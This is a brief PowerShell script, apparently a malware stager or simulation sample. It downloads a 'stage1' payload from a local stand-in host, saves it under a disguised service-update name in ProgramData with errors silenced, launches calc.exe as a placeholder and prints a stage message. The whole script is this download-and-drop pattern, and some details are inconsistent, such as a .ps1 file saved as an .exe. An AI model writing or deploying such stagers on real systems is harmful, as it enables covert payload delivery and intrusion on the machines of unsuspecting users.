
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://localhost:8081/stage1.ps1",
    [string]$LocalPath = 'C:\ProgramData\svcupdate.exe',
    [int]$TransferTimeout = 97
)
Invoke-WebRequest -Uri $PayloadUrl -OutFile $LocalPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Write-Output "stage 45 initialized"
Start-Sleep -Seconds 28
